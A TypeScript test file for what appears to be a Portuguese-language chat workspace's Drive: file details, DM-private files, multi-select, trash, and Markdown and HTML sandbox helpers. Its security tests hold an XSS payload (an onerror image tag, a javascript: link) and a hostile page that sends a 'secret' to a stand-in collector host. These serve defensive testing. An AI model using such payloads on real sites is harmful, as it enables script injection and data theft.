    expect(screen().queryByRole("dialog", { name: "Organograma do time" })).toBeNull();

    // Abrir: the same viewer as everywhere.
    await click(card("Organograma do time"));
    await settle(4);
    const details = screen().getByRole("dialog", { name: "Organograma do time" });
    // Two "Abrir": the dialog header's icon (open in its own page) and the file action with a text label.
    const openAction = within(details)
      .getAllByRole("button", { name: "Abrir" })
      .find((b) => b.textContent?.trim() === "Abrir");
    await click(openAction as HTMLElement);
    await settle(4);
    expect(screen().getByRole("dialog", { name: "Organograma do time" })).toBeTruthy();
  });

  test("the details' … matches Copiar link; who can see it, in plain words", async () => {
    await goDrive();
    await click(card("Organograma do time"));
    await settle(4);
    const panel = screen().getByRole("dialog", { name: "Organograma do time" });
    const more = within(panel).getByRole("button", { name: "Mais ações: Organograma do time" });
    expect(more.className).toBe(within(panel).getByRole("button", { name: "Copiar link" }).className);
    expect(panel.querySelector(".drive-audience")?.textContent).toBe(
      "Todo o workspace pode ver: está no canal público #eng",
    );
  });

  /** A file Atlas left in its DM with me, and one in the Drive only. */
  const withDmFile = async () => {
    const state = seedState();
    state.dms.push({
      channelId: "dm-atlas",
      with: { type: "agent", id: ATLAS_ID, name: "Atlas", handle: "atlas" },
    });
    const api = createFakeApi(state);
    await api.artifacts.create(ORG_ID, {
      title: "Rascunho da proposta",
      channelId: "dm-atlas",
      content: { kind: "document", markdown: "# Proposta" },
    });
    await api.artifacts.create(ORG_ID, {
      title: "Manual do time",
      content: { kind: "document", markdown: "# Manual" },
    });
    return goDrive({ api });
  };

  test("a DM's file: in Privado, says only the two of us see it, and opens that DM (never a channel)", async () => {
    const { router } = await withDmFile();
    // Its own section, last, apart from what the team sees.
    const heads = Array.from(document.querySelectorAll(".drive-group__head .ac-grouphead__title")).map(
      (h) => h.firstChild?.nextSibling?.textContent,
    );
    expect(heads.at(-1)).toBe("Privado");
    const privateSection = document.querySelectorAll(".drive-group")[heads.length - 1] as HTMLElement;
    expect(within(privateSection).getByRole("button", { name: "Rascunho da proposta" })).toBeTruthy();
    expect(within(privateSection).queryByRole("button", { name: "Manual do time" })).toBeNull();

    await click(card("Rascunho da proposta"));
    await settle(4);
    const panel = screen().getByRole("dialog", { name: "Rascunho da proposta" });
    expect(panel.querySelector(".drive-audience")?.textContent).toBe(
      "Só você e Atlas podem ver: veio de uma mensagem direta",
    );
    expect(panel.textContent).toContain("Mensagem direta com Atlas");
    await pick(panel, /^Mais ações: /, "Abrir a conversa");
    await settle(4);
    expect(router.state.location.pathname).toBe(`/org/${ORG_ID}/dm/agent/${ATLAS_ID}`);
  });

  test("a Drive-only file is seen by the whole workspace and has no conversation to open", async () => {
    await withDmFile();
    await click(card("Manual do time"));
    await settle(4);
    const panel = screen().getByRole("dialog", { name: "Manual do time" });
    expect(panel.querySelector(".drive-audience")?.textContent).toBe("Todo o workspace pode ver");
    expect(panel.textContent).toContain("Só no Drive");
    expect(panel.querySelector("button.drive-where")).toBeNull();
  });

  test("details list the versions; Ver opens an older one", async () => {
    await goDrive();
    await click(card("Relatório de incidente: checkout"));
    await settle(6);
    const panel = screen().getByRole("dialog", { name: "Relatório de incidente: checkout" });
    expect(panel.querySelectorAll(".drive-versions li")).toHaveLength(2);
    expect(panel.textContent).toContain("Acrescentei quem foi afetado.");
    await click(within(panel).getByRole("button", { name: "Ver a v1" }));
    await settle(6);
    expect(screen().getByRole("dialog").textContent).toContain("Vendo a v1");
  });

  test("a shared link opens the viewer directly", async () => {
    const first = await goDrive();
    const table = (await first.api.artifacts.list(ORG_ID)).find((a) => a.kind === "table") as Artifact;
    cleanup();
    // Links are per tab (mock store), so check with the same client.
    await goDrive({ api: first.api, path: `?artifact=${table.id}` });
    expect(screen().getByRole("dialog", { name: "Pedidos mais comuns nos reviews" })).toBeTruthy();
  });

  test("multi-select: checkbox, ⌘-click, ⌘A and Esc; the bar downloads, copies links and trashes", async () => {
    const { state } = await goDrive();
    await click(screen().getByRole("checkbox", { name: "Selecionar Organograma do time" }));
    const bar = () => screen().getByRole("toolbar", { name: "Seleção" });
    expect(bar().textContent).toContain("1 selecionado");
    // While selecting, a click selects (no details).
    await act(async () => fireEvent.click(card("Pedidos mais comuns nos reviews"), { metaKey: true }));
    expect(bar().textContent).toContain("2 selecionados");
    expect(document.querySelector(".drive-details")).toBeNull();

    await click(within(bar()).getByRole("button", { name: "Copiar links" }));
    await settle(2);
    expect(copied[0]?.split("\n")).toHaveLength(2);
    await click(within(bar()).getByRole("button", { name: "Baixar" }));
    await settle(4);
    expect(saved.map((s) => s.name).sort()).toEqual(["organograma-do-time.mmd", "pedidos-mais-comuns-nos-reviews.csv"]);

    await click(within(bar()).getByRole("button", { name: "Mover para a lixeira" }));
    const confirm = screen().getByRole("dialog", { name: "Mover 2 arquivos para a lixeira?" });
    await click(within(confirm).getByRole("button", { name: "Mover para a lixeira" }));
    await settle(5);
    expect(state.calls.filter((c) => c.method === "artifacts.remove")).toHaveLength(2);
    expect(names()).toHaveLength(3);
    expect(screen().queryByRole("toolbar", { name: "Seleção" })).toBeNull();
    await click(screen().getByRole("button", { name: "Desfazer" }));
    await settle(5);
    expect(state.calls.filter((c) => c.method === "artifacts.restore")).toHaveLength(2);
    expect(names()).toHaveLength(5);

    // ⌘A selects everything shown; Esc clears.
    await keyDown("a", { metaKey: true });
    expect(bar().textContent).toContain("5 selecionados");
    await keyDown("Escape");
    expect(screen().queryByRole("toolbar", { name: "Seleção" })).toBeNull();
  });

  test("Shift on a checkbox picks the range from the last pick; the bar's Selecionar os N takes everything shown", async () => {
    await goDrive();
    const boxes = () => screen().getAllByRole("checkbox", { name: /^Selecionar (?!os )/ });
    const [first, , third] = boxes();
    if (!first || !third) throw new Error("three items expected");
    await click(first);
    await act(async () => fireEvent.click(third, { shiftKey: true }));
    const bar = () => screen().getByRole("toolbar", { name: "Seleção" });
    expect(bar().textContent).toContain("3 selecionados");
    expect(boxes().map((b) => b.getAttribute("aria-checked"))).toEqual(["true", "true", "true", "false", "false"]);
    await click(within(bar()).getByRole("button", { name: "Selecionar os 5" }));
    expect(bar().textContent).toContain("5 selecionados");
    // Everything picked: the button goes.
    expect(within(bar()).queryByRole("button", { name: "Selecionar os 5" })).toBeNull();
  });

  test("the list's head checkbox: all, some (a dash) and none", async () => {
    await goDrive();
    const view = screen().getByRole("radiogroup", { name: "Visualização" });
    await click(within(view).getByRole("radio", { name: "Lista" }));
    const all = screen().getByRole("checkbox", { name: "Selecionar os 5" });
    expect(all.closest(".drive-table__head")).not.toBeNull();
    expect(all.getAttribute("aria-checked")).toBe("false");
    await click(all);
    expect(screen().getByRole("toolbar", { name: "Seleção" }).textContent).toContain("5 selecionados");
    expect(all.getAttribute("aria-checked")).toBe("true");
    const [one] = screen().getAllByRole("checkbox", { name: /^Selecionar (?!os )/ });
    if (!one) throw new Error("an item expected");
    await click(one);
    expect(all.getAttribute("aria-checked")).toBe("mixed");
    await click(all);
    await click(all);
    expect(screen().queryByRole("toolbar", { name: "Seleção" })).toBeNull();
  });
});

describe("artifact helpers", () => {
  const patch = "@@ -1,3 +1,3 @@\n a\n-b\n+B\n c\n";
  test("patch parsing, counts and side-by-side pairing", () => {
    expect(patchCounts(patch)).toEqual({ added: 1, removed: 1 });
    const lines = parsePatch(patch);
    expect(lines.map((l) => [l.kind, l.old, l.new])).toEqual([
      ["hunk", null, null],
      ["same", 1, 1],
      ["del", 2, null],
      ["add", null, 2],
      ["same", 3, 3],
    ]);
    const rows = sideBySide(lines);
    expect(rows[2]).toEqual({ left: { n: 2, text: "b", kind: "del" }, right: { n: 2, text: "B", kind: "add" } });
  });

  test("CSV quoting and number-aware sort", () => {
    expect(toCsv(["a", "b"], [["1,5", 'diz "oi"']])).toBe('a,b\n"1,5","diz ""oi"""');
    expect(sortRows([["10"], ["9"], ["1.200,5"]], 0, "asc", "pt-BR").map((r) => r[0])).toEqual(["9", "10", "1.200,5"]);
  });

  test("Drive arrangement: groups by date, sorts by name, shift ranges, days left in the trash", () => {
    const now = new Date("2026-10-16T12:00:00");
    const at = (id: string, title: string, iso: string) =>
      ({
        id,
        title,
        kind: "document",
        updatedAt: iso,
        channelId: null,
        createdBy: { type: "agent", id: "a" },
        audience: { kind: "workspace" },
      }) as Artifact;
    const list = [
      at("1", "b", "2026-10-16T09:00:00"),
      at("2", "a", "2026-10-13T09:00:00"),
      at("3", "c", "2026-09-01T09:00:00"),
    ];
    expect(groupArtifacts(list, "date", now).map((s) => [s.key, s.items.map((a) => a.id)])).toEqual([
      ["today", ["1"]],
      ["week", ["2"]],
      ["earlier", ["3"]],
    ]);
    expect(groupArtifacts(list, "none", now)).toHaveLength(1);
    expect(groupArtifacts(list, "channel", now).map((s) => s.key)).toEqual([""]);
    expect(sortArtifacts(list, "name", "pt-BR").map((a) => a.title)).toEqual(["a", "b", "c"]);
    expect(rangeOf(["1", "2", "3", "4"], "3", "1")).toEqual(["1", "2", "3"]);
    expect(rangeOf(["1", "2"], null, "2")).toEqual(["2"]);
    expect(daysLeft("2026-10-19T12:00:00", now)).toBe(3);
    expect(daysLeft("2026-10-01T12:00:00", now)).toBe(0);
  });

  test("private files get a section of their own; each file opens where it came from", () => {
    const now = new Date("2026-10-16T12:00:00");
    const file = (id: string, audience: Artifact["audience"], channelId: string | null = "c", threadId = null) =>
      ({
        id,
        title: id,
        kind: "document",
        updatedAt: "2026-10-16T09:00:00",
        channelId,
        threadId,
        createdBy: { type: "agent", id: "a" },
        audience,
      }) as unknown as Artifact;
    const dm = file("dm", { kind: "dm", with: { type: "person", id: "u2" } });
    const locked = file("locked", { kind: "channel", name: "x", private: true });
    const open = file("open", { kind: "channel", name: "eng", private: false });
    const drive = file("drive", { kind: "workspace" }, null);
    expect(driveSections([dm, open, locked, drive], "date", now).map((s) => [s.key, s.items.map((a) => a.id)])).toEqual(
      [
        ["today", ["open", "drive"]],
        ["private", ["dm", "locked"]],
      ],
    );
    expect(driveSections([open], "none", now).map((s) => s.key)).toEqual([""]);
    expect(artifactPlace(dm)).toEqual({ to: "/org/$orgId/dm/person/$userId", params: { userId: "u2" } });
    expect(artifactPlace(open)).toEqual({ to: "/org/$orgId/c/$channelId", params: { channelId: "c" } });
    expect(artifactPlace({ ...dm, threadId: "root" })).toEqual({
      to: "/org/$orgId/threads/$threadId",
      params: { threadId: "root" },
    });
    expect(artifactPlace(drive)).toBeNull();
    expect(artifactPlace(file("gone", { kind: "dm", with: null }))).toBeNull();
    // An archived agent's or a departed person's DM can't be opened: no button, never an error page.
    expect(artifactPlace(file("archived", { kind: "dm", with: { type: "agent", id: "a" }, gone: true }))).toBeNull();
  });

  test("document preview skips marks and code", () => {
    expect(documentPreview("# Título\n\n```\ncode\n```\n- **um**\n- dois\n")).toEqual(["Título", "um", "dois"]);
  });

  test("Markdown never interprets HTML and only links http(s)", () => {
    const { container } = render(
      <Markdown source={'<img src=x onerror="alert(1)">\n\n[ok](https://a.example) [no](javascript:alert(1))'} />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("<img src=x");
    const links = container.querySelectorAll("a");
    expect(links).toHaveLength(1);
    expect(links[0]?.getAttribute("href")).toBe("https://a.example");
    expect(links[0]?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(parseMarkdown("| a | b |\n|---|---|\n| 1 | 2 |")[0]).toEqual({
      type: "table",
      header: ["a", "b"],
      rows: [["1", "2"]],
      align: ["right", "right"],
    });
  });
});

describe("deleting a file", () => {
  const goDrive = async () => {
    const state = seedState();
    const api = createFakeApi(state);
    const r = await renderApp(`/org/${ORG_ID}/drive`, { api });
    await settle(8);
    return { ...r, api, state };
  };
  test("the viewer header: one-line title with a tooltip, Baixar ▾, Editar, … with Mover para a lixeira", async () => {
    await openChannel();
    const dialog = await openCard("Relatório de incidente: checkout");
    const title = dialog.querySelector(".artifact-sheet__title") as HTMLElement;
    expect(title.getAttribute("title")).toBe("Relatório de incidente: checkout");
    expect(within(dialog).getByRole("button", { name: "Editar" }).getAttribute("title")).toBe("Editar");
    expect(within(dialog).queryByRole("button", { name: "Baixar PDF" })).toBeNull();
  });

  test("Mover para a lixeira asks, naming the file; then 'Movido para a lixeira · Desfazer' restores it", async () => {
    const { state } = await goDrive();
    // From the details panel's "…".
    await click(screen().getByRole("button", { name: "Organograma do time" }));
    await settle(4);
    const panel = screen().getByRole("dialog", { name: "Organograma do time" });
    await pick(panel, /^Mais ações: /, "Mover para a lixeira");
    const confirm = screen().getByRole("dialog", { name: "Mover “Organograma do time” para a lixeira?" });
    expect(confirm.textContent).toContain("lixeira por 30 dias");
    await click(within(confirm).getByRole("button", { name: "Mover para a lixeira" }));
    await settle(5);
    expect(state.calls.some((c) => c.method === "artifacts.remove")).toBe(true);
    expect(screen().queryByRole("button", { name: "Organograma do time" })).toBeNull();
    expect(document.querySelector(".drive-details")).toBeNull();
    expect(screen().getByText("Movido para a lixeira")).toBeTruthy();
    await click(screen().getByRole("button", { name: "Desfazer" }));
    await settle(5);
    expect(state.calls.some((c) => c.method === "artifacts.restore")).toBe(true);
    expect(screen().getByRole("button", { name: "Organograma do time" })).toBeTruthy();
  });

  test("Lixeira lists deleted files with Restaurar", async () => {
    const { api } = await goDrive();
    const list = await api.artifacts.list(ORG_ID);
    const chart = list.find((a) => a.title === "Organograma do time") as Artifact;
    await act(async () => api.artifacts.remove(ORG_ID, chart.id));
    await click(screen().getByRole("button", { name: "Lixeira" }));
    await settle(4);
    expect(screen().getByRole("heading", { level: 1, name: "Lixeira do Drive" })).toBeTruthy();
    expect(screen().getByText("Organograma do time")).toBeTruthy();
    await click(screen().getByRole("button", { name: "Restaurar" }));
    await settle(4);
    expect(screen().getByText("A lixeira está vazia.")).toBeTruthy();
  });

  test("Apagar para sempre, after a confirmation, takes it out of the trash", async () => {
    const { api, state } = await goDrive();
    const chart = (await api.artifacts.list(ORG_ID)).find((a) => a.title === "Organograma do time") as Artifact;
    await act(async () => api.artifacts.remove(ORG_ID, chart.id));
    await click(screen().getByRole("button", { name: "Lixeira" }));
    await settle(4);
    expect(screen().getByText(/não contam no armazenamento/)).toBeTruthy();
    await click(screen().getByRole("button", { name: "Apagar para sempre: Organograma do time" }));
    const confirm = screen().getByRole("dialog", { name: "Apagar “Organograma do time” para sempre?" });
    await click(within(confirm).getByRole("button", { name: "Apagar para sempre" }));
    await settle(5);
    expect(state.calls.filter((c) => c.method === "artifacts.purge")).toHaveLength(1);
    expect(screen().getByText("A lixeira está vazia.")).toBeTruthy();
  });

  test("a chat card for a deleted file is a quiet 'Arquivo removido'", async () => {
    const { ArtifactCard } = await import("@/components/artifacts/ArtifactCard");
    expect(ArtifactCard).toBeTruthy();
    const { artifactRefs } = await import("@agenteschat/client/lib/artifacts");
    expect(artifactRefs({ artifacts: [{ id: "x", deleted: true, title: "Relatório" }] })).toEqual([
      { id: "x", deleted: true, title: "Relatório" },
    ]);
  });
});

describe("html shim", () => {
  test("runs before the page, behind the policy", () => {
    const page = withShim("<!doctype html><html><head><title>x</title></head><body></body></html>");
    expect(page.startsWith("<!doctype html><html><head>")).toBe(true);
    expect(page.indexOf("Content-Security-Policy")).toBeLessThan(page.indexOf("<script>"));
    expect(page.indexOf("<script>")).toBeLessThan(page.indexOf("<title>"));
    expect(withShim("<h1>a</h1>").indexOf("<script>")).toBeLessThan(withShim("<h1>a</h1>").indexOf("<h1>"));
  });

  test("a chat card's preview loads nothing from the network, its policy before anything of the page", () => {
    const hostile = `<!doctype html><img src="https://collect.example.net/?d=secret"><html><head><title>x</title></head></html>`;
    const preview = withShim(hostile);
    const policy = `<meta http-equiv="Content-Security-Policy" content="${PAGE_CSP}">`;
    expect(preview.indexOf(policy)).toBeGreaterThan(-1);
    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<img"));
    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<script>"));
    expect(PAGE_CSP).toContain("default-src 'none'");
    expect(PAGE_CSP).not.toContain("http");
  });

  test("the card's frame loads the page behind the policy", async () => {
    const pages: Blob[] = [];
    const create = URL.createObjectURL;
    URL.createObjectURL = (b: Blob | MediaSource) => {
      pages.push(b as Blob);
      return `blob:page-${pages.length}`;
    };
    try {
      const html = "<!doctype html><html><head></head><body>x</body></html>";
      render(<HtmlFrame html={html} title="card" thumbnail />);
      await settle(1);
      const card = await pages[0]?.text();
      expect(card?.indexOf(PAGE_CSP)).toBeGreaterThan(-1);
      expect(card?.indexOf(PAGE_CSP)).toBeLessThan(card?.indexOf("<body>") ?? -1);
    } finally {
      URL.createObjectURL = create;
    }
  });
});
